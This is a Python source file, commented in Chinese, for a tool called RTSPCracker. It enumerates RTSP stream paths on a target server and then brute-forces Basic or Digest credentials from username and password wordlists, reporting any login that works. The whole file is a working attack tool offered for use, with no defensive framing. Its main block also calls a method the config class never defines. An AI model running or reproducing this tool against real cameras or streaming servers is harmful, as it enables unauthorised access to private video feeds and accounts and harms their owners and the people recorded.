import socket
import hashlib
import base64
import os
from typing import List, Optional
from dataclasses import dataclass

@dataclass
class RTSPConfig:
    """RTSP配置类"""
    server_ip: str = ""
    server_port: int = 554
    server_path: str = ""
    user_agent: str = "RTSP Client"
    buffer_len: int = 1024
    username_file: str = ""
    password_file: str = ""
    uri_file: str = ""
    brute_force_method: str = 'Digest'

    @property
    def base_url(self) -> str:
        return f'rtsp://{self.server_ip}:{self.server_port}{self.server_path}'

class RTSPCracker:
    """RTSP破解器类"""
    def __init__(self, config: RTSPConfig):
        self.config = config
        self.socket = None

    def connect(self) -> None:
        """建立socket连接"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.config.server_ip, self.config.server_port))
        except socket.error as e:
            print(f"[-] 连接失败: {str(e)}")
            raise

    def gen_base_auth_header(self, username: str, password: str) -> str:
        """生成Basic认证头"""
        auth_64 = base64.b64encode(f"{username}:{password}".encode()).decode()
        header = (
            f'DESCRIBE {self.config.base_url} RTSP/1.0\r\n'
            f'CSeq: 4\r\n'
            f'User-Agent: {self.config.user_agent}\r\n'
            f'Accept: application/sdp\r\n'
            f'Authorization: Basic {auth_64}\r\n\r\n'
        )
        return header

    def gen_digest_header(self) -> str:
        """生成Digest认证请求头"""
        return (
            f'DESCRIBE {self.config.base_url} RTSP/1.0\r\n'
            f'CSeq: 4\r\n'
            f'User-Agent: {self.config.user_agent}\r\n'
            f'Accept: application/sdp\r\n\r\n'
        )

    def gen_digest_auth_header(self, username: str, password: str, realm: str, nonce: str) -> str:
        """生成Digest认证头"""
        response = self._calculate_digest_response(username, password, realm, nonce)
        return (
            f'DESCRIBE {self.config.base_url} RTSP/1.0\r\n'
            f'CSeq: 5\r\n'
            f'Authorization: Digest username="{username}", realm="{realm}", '
            f'nonce="{nonce}", uri="{self.config.base_url}", response="{response}"\r\n'
            f'User-Agent: {self.config.user_agent}\r\n'
            f'Accept: application/sdp\r\n\r\n'
        )

    def _calculate_digest_response(self, username: str, password: str, realm: str, nonce: str) -> str:
        """计算Digest认证响应值"""
        ha1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
        ha2 = hashlib.md5(f"DESCRIBE:{self.config.base_url}".encode()).hexdigest()
        return hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()

    def try_basic_auth(self, username: str, password: str) -> bool:
        """尝试Basic认证"""
        header = self.gen_base_auth_header(username, password)
        self.socket.send(header.encode())
        response = self.socket.recv(self.config.buffer_len).decode()
        return '200 OK' in response

    def try_digest_auth(self, username: str, password: str) -> bool:
        """尝试Digest认证"""
        # 获取realm和nonce
        header = self.gen_digest_header()
        self.socket.send(header.encode())
        response = self.socket.recv(self.config.buffer_len).decode()
        
        # 添加调试输出
        print(f"[*] 服务器响应:\n{response}")
        
        try:
            # 修改提取逻辑，适应不同的响应格式
            if 'WWW-Authenticate: Digest' not in response:
                print("[-] 服务器未返回Digest认证信息")
                return False
                
            realm = self._extract_value(response, 'realm')
            nonce = self._extract_value(response, 'nonce')
            
            print(f"[*] 提取到的认证信息: realm={realm}, nonce={nonce}")
            
        except ValueError as e:
            print(f"[-] 无法提取realm或nonce值: {str(e)}")
            # 尝试重新连接
            self.socket.close()
            self.connect()
            return False

        # 发送认证请求
        auth_header = self.gen_digest_auth_header(username, password, realm, nonce)
        try:
            self.socket.send(auth_header.encode())
            response = self.socket.recv(self.config.buffer_len).decode()
            
            # 添加调试输出
            print(f"[*] 认证响应:\n{response}")
            
            if '200 OK' in response:
                return True
            elif 'Unauthorized' in response:
                return False
            else:
                print(f"[*] 未知响应状态")
                return False
                
        except Exception as e:
            print(f"[-] 发送认证请求时发生错误: {str(e)}")
            self.socket.close()
            self.connect()
            return False

    @staticmethod
    def _extract_value(response: str, key: str) -> str:
        """从响应中提取值 - 改进的提取方法"""
        try:
            # 支持多种可能的格式
            patterns = [
                f'{key}="([^"]*)"',  # 标准格式 key="value"
                f'{key}=([^,\s]*)',  # 无引号格式 key=value
                f'{key}=\'([^\']*)\'',  # 单引号格式 key='value'
            ]
            
            for pattern in patterns:
                import re
                match = re.search(pattern, response)
                if match:
                    return match.group(1)
                    
            raise ValueError(f"在响应中未找到{key}的值")
            
        except Exception as e:
            raise ValueError(f"提取{key}时发生错误: {str(e)}")

    def uri_bruteforce(self) -> Optional[List[str]]:
        """URI路径爆破"""
        if not os.path.exists('uri.txt'):
            print("[-] 未找到uri.txt文件")
            return None

        print("[+] 开始URI路径爆破...")
        found_uris = []

        with open('uri.txt', 'r') as f:
            uris = f.read().splitlines()

        for uri in uris:
            if not uri.strip():  # 跳过空行
                continue
                
            uri = f"/{uri.lstrip('/')}"
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as test_socket:
                    test_socket.connect((self.config.server_ip, self.config.server_port))
                    header = (
                        f'DESCRIBE rtsp://{self.config.server_ip}:{self.config.server_port}{uri} RTSP/1.0\r\n'
                        f'CSeq: 1\r\n'
                        f'User-Agent: {self.config.user_agent}\r\n'
                        f'Accept: application/sdp\r\n\r\n'
                    )
                    test_socket.send(header.encode())
                    response = test_socket.recv(self.config.buffer_len).decode()
                    
                    print(f"[*] 测试URI {uri} 的响应:\n{response}")  # 添加调试输出

                    # 扩展响应检查条件
                    if ('401 Unauthorized' in response or 
                        'WWW-Authenticate' in response or 
                        'Authorization' in response):
                        print(f"[+] 发现有效URI: {uri} (需要认证)")
                        found_uris.append(uri)
                        # 更新当前使用的URI路径
                        self.config.server_path = uri
                        return found_uris  # 找到第一个有效URI就返回

            except Exception as e:
                print(f"[-] 测试URI {uri} 时发生错误: {str(e)}")
                continue

        if not found_uris:
            print("[-] 未找到有效URI，将使用默认路径")
            
        return found_uris

    def brute_force(self) -> None:
        """执行暴力破解"""
        try:
            self.connect()
            found_uris = self.uri_bruteforce()
            
            if found_uris:
                print(f"[+] 使用发现的URI路径: {self.config.server_path}")
            else:
                print(f"[*] 使用默认路径: {self.config.server_path}")
            
            print(f"[+] 开始使用 {self.config.brute_force_method} 方式进行暴力破解...")
            
            with open(self.config.username_file, "r") as usernames:
                for username in usernames:
                    username = username.strip()
                    if not username:  # 跳过空行
                        continue
                        
                    with open(self.config.password_file, "r") as passwords:
                        for password in passwords:
                            password = password.strip()
                            if not password:  # 跳过空行
                                continue
                                
                            print(f"[*] 尝试: {username}:{password}")
                            try:
                                if self.config.brute_force_method == 'Basic':
                                    if self.try_basic_auth(username, password):
                                        print(f"[+] 发现有效凭据 -- {username}:{password}")
                                        return  # 找到后立即返回
                                else:
                                    if self.try_digest_auth(username, password):
                                        print(f"[+] 发现有效凭据 -- {username}:{password}")
                                        return  # 找到后立即返回
                                        
                            except Exception as e:
                                print(f"[-] 尝试 {username}:{password} 时发生错误: {str(e)}")
                                # 重新建立连接
                                self.socket.close()
                                self.connect()
                                continue

        finally:
            if self.socket:
                self.socket.close()

# 修改main部分，只在直接运行时执行
if __name__ == "__main__":
    config = RTSPConfig()
    config.load_uri_from_file()
    cracker = RTSPCracker(config)
    cracker.brute_force()